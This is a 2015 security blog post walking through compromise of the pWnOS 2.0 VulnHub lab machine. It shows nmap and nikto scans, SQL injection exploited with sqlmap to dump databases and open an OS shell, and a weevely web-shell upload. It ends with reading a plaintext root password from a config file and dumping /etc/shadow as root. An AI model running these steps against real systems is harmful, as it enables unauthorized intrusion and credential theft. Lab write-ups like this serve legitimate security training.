@@ -1,0 +1,594 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>pWnOS: 2.0 - 0x41414141</title>
+  <meta name="author" content="Norbert Szetei">
+
+  
+  <meta name="description" content="Image: pWnOS: 2.0 (Pre-Release) Nmap output: 1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+root@kali32:~# nmap 10.10.10.100 -sV -p- Starting Nmap 6.47 ( &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://73696e65.github.io/blog/2015/05/22/pwnos-2-dot-0/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="0x41414141" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">0x41414141</a></h1>
+  
+    <h2>information security notes</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="sitesearch" value="73696e65.github.io">
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">pWnOS: 2.0</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-05-22T08:40:50+02:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>22</span><span class='date-suffix'>nd</span>, <span class='date-year'>2015</span></span> <span class='time'>8:40 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p>Image: <a href="https://www.vulnhub.com/entry/pwnos-20-pre-release,34/">pWnOS: 2.0 (Pre-Release)</a></p>
+
+<p>Nmap output:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# nmap 10.10.10.100 -sV -p-
+</span><span class='line'>
+</span><span class='line'>Starting Nmap 6.47 ( http://nmap.org ) at 2015-04-27 14:45 CEST
+</span><span class='line'>Stats: 0:00:07 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
+</span><span class='line'>Service scan Timing: About 50.00% done; ETC: 14:45 (0:00:06 remaining)
+</span><span class='line'>Nmap scan report for 10.10.10.100
+</span><span class='line'>Host is up (0.00030s latency).
+</span><span class='line'>Not shown: 65533 closed ports
+</span><span class='line'>PORT   STATE SERVICE VERSION
+</span><span class='line'>22/tcp open  ssh     OpenSSH 5.8p1 Debian 1ubuntu3 (Ubuntu Linux; protocol 2.0)
+</span><span class='line'>80/tcp open  http    Apache httpd 2.2.17 ((Ubuntu))
+</span><span class='line'>MAC Address: 00:0C:29:61:0D:EB (VMware)
+</span><span class='line'>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span><span class='line'>
+</span><span class='line'>Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 7.54 seconds</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Nikto output:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# nikto -h 10.10.10.100
+</span><span class='line'>- Nikto v2.1.6
+</span><span class='line'>---------------------------------------------------------------------------
+</span><span class='line'>+ Target IP:          10.10.10.100
+</span><span class='line'>+ Target Hostname:    10.10.10.100
+</span><span class='line'>+ Target Port:        80
+</span><span class='line'>+ Start Time:         2015-04-27 14:46:59 (GMT2)
+</span><span class='line'>---------------------------------------------------------------------------
+</span><span class='line'>+ Server: Apache/2.2.17 (Ubuntu)
+</span><span class='line'>+ Cookie PHPSESSID created without the httponly flag
+</span><span class='line'>+ Retrieved x-powered-by header: PHP/5.3.5-1ubuntu7
+</span><span class='line'>+ The anti-clickjacking X-Frame-Options header is not present.
+</span><span class='line'>+ Uncommon header 'tcn' found, with contents: list
+</span><span class='line'>+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.php
+</span><span class='line'>+ Apache/2.2.17 appears to be outdated (current is at least Apache/2.4.7). Apache 2.0.65 (final release) and 2.2.26 are also current.
+</span><span class='line'>+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+</span><span class='line'>+ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+</span><span class='line'>+ OSVDB-12184: /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+</span><span class='line'>+ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+</span><span class='line'>+ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+</span><span class='line'>+ OSVDB-3268: /includes/: Directory indexing found.
+</span><span class='line'>+ OSVDB-3092: /includes/: This might be interesting...
+</span><span class='line'>+ OSVDB-3092: /info/: This might be interesting...
+</span><span class='line'>+ OSVDB-3092: /login/: This might be interesting...
+</span><span class='line'>+ OSVDB-3092: /register/: This might be interesting...
+</span><span class='line'>+ OSVDB-3233: /info.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.
+</span><span class='line'>+ OSVDB-3268: /icons/: Directory indexing found.
+</span><span class='line'>+ Server leaks inodes via ETags, header found with file /icons/README, inode: 1311031, size: 5108, mtime: Tue Aug 28 12:48:10 2007
+</span><span class='line'>+ OSVDB-3233: /icons/README: Apache default file found.
+</span><span class='line'>+ OSVDB-5292: /info.php?file=http://cirt.net/rfiinc.txt?: RFI from RSnake's list (http://ha.ckers.org/weird/rfi-locations.dat) or from http://osvdb.org/
+</span><span class='line'>+ /login.php: Admin login page/section found.
+</span><span class='line'>+ 7331 requests: 0 error(s) and 22 item(s) reported on remote host
+</span><span class='line'>+ End Time:           2015-04-27 14:47:09 (GMT2) (10 seconds)
+</span><span class='line'>---------------------------------------------------------------------------
+</span><span class='line'>+ 1 host(s) tested</span></code></pre></td></tr></table></div></figure>
+
+
+<p>There is a SQL injection in email, we can see an error message trying to log in (filling an email field with the single quote):</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>http://10.10.10.100/login.php:
+</span><span class='line'>
+</span><span class='line'>An error occurred in script '/var/www/login.php' on line 47: Query: SELECT *
+</span><span class='line'>FROM users WHERE email=''' AND pass='86f7e437faa5a7fce15d1ddcb9eaeaea377667b8'
+</span><span class='line'>AND active IS NULL 
+</span><span class='line'>
+</span><span class='line'>MySQL Error: You have an error in your SQL syntax; check the
+</span><span class='line'>manual that corresponds to your MySQL server version for the right syntax to
+</span><span class='line'>use near '86f7e437faa5a7fce15d1ddcb9eaeaea377667b8' AND active IS NULL' at line 1</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Using Sqlmap we dump the whole databases:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ sqlmap -u "http://10.10.10.100/login.php" --forms --dump-all
+</span><span class='line'>[ .. snip .. ]
+</span><span class='line'>email=test@test.com&pass=123&submit=Login&submitted=TRUE</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We try to crack hashes but without success in the reasonable time:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~/.sqlmap/output/10.10.10.100/dump# cat mysql/user-f3649c95.csv | cut -d, -f2-3 | sed 's#,#:#' > /tmp/hashes.csv
+</span><span class='line'>root@kali32:~/.sqlmap/output/10.10.10.100/dump# john --format=mysql-sha1 /tmp/hashes.csv 
+</span><span class='line'>[ .. snip .. ]
+</span><span class='line'>root@kali32:~/.sqlmap/output/10.10.10.100/dump# cat ch16/users.csv 
+</span><span class='line'>user_id,pass,email,active,last_name,first_name,user_level,registration_date
+</span><span class='line'>1,c2c4b4e51d9e23c02c15702c136c3e950ba9a4af,admin@isints.com,NULL,Privett,Dan,0,2011-05-07 17:27:01</span></code></pre></td></tr></table></div></figure>
+
+
+<p>With OS Shell functionality of Sqlmap (&ndash;os-shell), we was able to obtain shell with the web user privileges:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>os-shell> cat /etc/passwd
+</span><span class='line'>do you want to retrieve the command standard output? [Y/n/a] y
+</span><span class='line'>command standard output:
+</span><span class='line'>---
+</span><span class='line'>root:x:0:0:root:/root:/bin/bash
+</span><span class='line'>daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+</span><span class='line'>bin:x:2:2:bin:/bin:/bin/sh
+</span><span class='line'>sys:x:3:3:sys:/dev:/bin/sh
+</span><span class='line'>sync:x:4:65534:sync:/bin:/bin/sync
+</span><span class='line'>games:x:5:60:games:/usr/games:/bin/sh
+</span><span class='line'>man:x:6:12:man:/var/cache/man:/bin/sh
+</span><span class='line'>lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+</span><span class='line'>mail:x:8:8:mail:/var/mail:/bin/sh
+</span><span class='line'>news:x:9:9:news:/var/spool/news:/bin/sh
+</span><span class='line'>uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+</span><span class='line'>proxy:x:13:13:proxy:/bin:/bin/sh
+</span><span class='line'>www-data:x:33:33:www-data:/var/www:/bin/sh
+</span><span class='line'>backup:x:34:34:backup:/var/backups:/bin/sh
+</span><span class='line'>list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+</span><span class='line'>irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+</span><span class='line'>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+</span><span class='line'>nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+</span><span class='line'>libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+</span><span class='line'>syslog:x:101:103::/home/syslog:/bin/false
+</span><span class='line'>mysql:x:0:0:MySQL Server,,,:/root:/bin/bash
+</span><span class='line'>sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
+</span><span class='line'>landscape:x:104:110::/var/lib/landscape:/bin/false
+</span><span class='line'>dan:x:1000:1000:Dan Privett,,,:/home/dan:/bin/bash</span></code></pre></td></tr></table></div></figure>
+
+
+<p>As we can see, MySQL daemon is running as root (=uid 0), this is also the
+reason, why we were able to write something with database user to /var/www
+(owned by www-data), that&rsquo;s not common.</p>
+
+<p>We can also upload weevely to the remote system and use it as the more sophisticated shell:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# sqlmap -u "http://10.10.10.100/login.php" --data "email=test@test.com&pass=123&submit=Login&submitted=TRUE" --file-write="/var/www/weevely.php.txt" --file-dest=/var/www/w.php</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We found the database credentials, however they didn&rsquo;t work:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>www-data@web:/var/www $ cat mysqli_connect.php
+</span><span class='line'>&lt;?php # Script 8.2 - mysqli_connect.php
+</span><span class='line'>
+</span><span class='line'>// This file contains the database access information.
+</span><span class='line'>// This file also establishes a connection to MySQL
+</span><span class='line'>// and selects the database.
+</span><span class='line'>
+</span><span class='line'>// Set the database access information as constants:
+</span><span class='line'>
+</span><span class='line'>DEFINE ('DB_USER', 'root');
+</span><span class='line'>DEFINE ('DB_PASSWORD', 'goodday');
+</span><span class='line'>DEFINE ('DB_HOST', 'localhost');
+</span><span class='line'>DEFINE ('DB_NAME', 'ch16');
+</span><span class='line'>
+</span><span class='line'>// Make the connection:
+</span><span class='line'>
+</span><span class='line'>$dbc = @mysqli_connect (DB_HOST, DB_USER, DB_PASSWORD, DB_NAME) OR die ('Could not connect to MySQL: ' . mysqli_connect_error() );
+</span><span class='line'>
+</span><span class='line'>?></span></code></pre></td></tr></table></div></figure>
+
+
+<p>That was strange, because the web application is connected. After a little more digging, we found this suspicious file:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>www-data@web:/var/www $ cat ../mysqli_connect.php
+</span><span class='line'>&lt;?php # Script 8.2 - mysqli_connect.php
+</span><span class='line'>
+</span><span class='line'>// This file contains the database access information.
+</span><span class='line'>// This file also establishes a connection to MySQL
+</span><span class='line'>// and selects the database.
+</span><span class='line'>
+</span><span class='line'>// Set the database access information as constants:
+</span><span class='line'>
+</span><span class='line'>DEFINE ('DB_USER', 'root');
+</span><span class='line'>DEFINE ('DB_PASSWORD', 'root@ISIntS');
+</span><span class='line'>DEFINE ('DB_HOST', 'localhost');
+</span><span class='line'>DEFINE ('DB_NAME', 'ch16');
+</span><span class='line'>
+</span><span class='line'>// Make the connection:
+</span><span class='line'>
+</span><span class='line'>$dbc = @mysqli_connect (DB_HOST, DB_USER, DB_PASSWORD, DB_NAME) OR die ('Could not connect to MySQL: ' . mysqli_connect_error() );
+</span><span class='line'>
+</span><span class='line'>?></span></code></pre></td></tr></table></div></figure>
+
+
+<p>The <a href="http://10.10.10.100/blog/index.php">blog application</a> use the text files instead of MySQL. We were only
+able to locate the password file, without cracking it:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>www-data@web:/var/www $ cat blog/config/password.txt
+</span><span class='line'>$1$weWj5iAZ$NU4CkeZ9jNtcP/qrPC69a/</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Using root / root@ISIntS we can finally log in via ssh as root:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@web:~# cat /etc/shadow 
+</span><span class='line'>root:$6$aO1TGdyc$XfiMyap/.QYhjIip5xxrgpO1ydlo.DQXns3fYYLt1hiH4Fp0PJP4TMoDSg3wpAFklF03dV2cUDL04YcR9bSSI/:15101:0:99999:7:::
+</span><span class='line'>daemon:*:15101:0:99999:7:::
+</span><span class='line'>bin:*:15101:0:99999:7:::
+</span><span class='line'>sys:*:15101:0:99999:7:::
+</span><span class='line'>sync:*:15101:0:99999:7:::
+</span><span class='line'>games:*:15101:0:99999:7:::
+</span><span class='line'>man:*:15101:0:99999:7:::
+</span><span class='line'>lp:*:15101:0:99999:7:::
+</span><span class='line'>mail:*:15101:0:99999:7:::
+</span><span class='line'>news:*:15101:0:99999:7:::
+</span><span class='line'>uucp:*:15101:0:99999:7:::
+</span><span class='line'>proxy:*:15101:0:99999:7:::
+</span><span class='line'>www-data:*:15101:0:99999:7:::
+</span><span class='line'>backup:*:15101:0:99999:7:::
+</span><span class='line'>list:*:15101:0:99999:7:::
+</span><span class='line'>irc:*:15101:0:99999:7:::
+</span><span class='line'>gnats:*:15101:0:99999:7:::
+</span><span class='line'>nobody:*:15101:0:99999:7:::
+</span><span class='line'>libuuid:!:15101:0:99999:7:::
+</span><span class='line'>syslog:*:15101:0:99999:7:::
+</span><span class='line'>mysql:!:15101:0:99999:7:::
+</span><span class='line'>sshd:*:15101:0:99999:7:::
+</span><span class='line'>landscape:*:15101:0:99999:7:::
+</span><span class='line'>dan:$6$Iu1ipXkP$F9Jdj7JNf56/UjrXgOTks3mqYO6J/ErWUtf.EWr2AT8lv6aHy3K6Ywjmd7HCUswgiEYDHMwq/aqwJToXl0ERs1:15101:0:99999:7:::</span></code></pre></td></tr></table></div></figure>
+
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">Norbert Szetei</span></span>
+
+      
+
+
+
+
+<time class='entry-date' datetime='2015-05-22T08:40:50+02:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>22</span><span class='date-suffix'>nd</span>, <span class='date-year'>2015</span></span> <span class='time'>8:40 am</span></time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/pwnos/'>pwnos</a>, <a class='category' href='/blog/categories/vulnhub/'>vulnhub</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://73696e65.github.io/blog/2015/05/22/pwnos-2-dot-0/" data-via="" data-counturl="http://73696e65.github.io/blog/2015/05/22/pwnos-2-dot-0/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2015/05/17/kioptrix-level-3/" title="Previous Post: Kioptrix: Level 3">&laquo; Kioptrix: Level 3</a>
+      
+      
+    </p>
+  </footer>
+</article>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2015/05/22/pwnos-2-dot-0/">pWnOS: 2.0</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/05/17/kioptrix-level-3/">Kioptrix: Level 3</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/05/16/rattus-loophole/">Rattus: Loophole</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/05/14/de-ice-s1-dot-130/">DE-ICE-S1.130</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/05/13/de-ice-s1-dot-120/">DE-ICE-S1.120</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2015 - Norbert Szetei -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
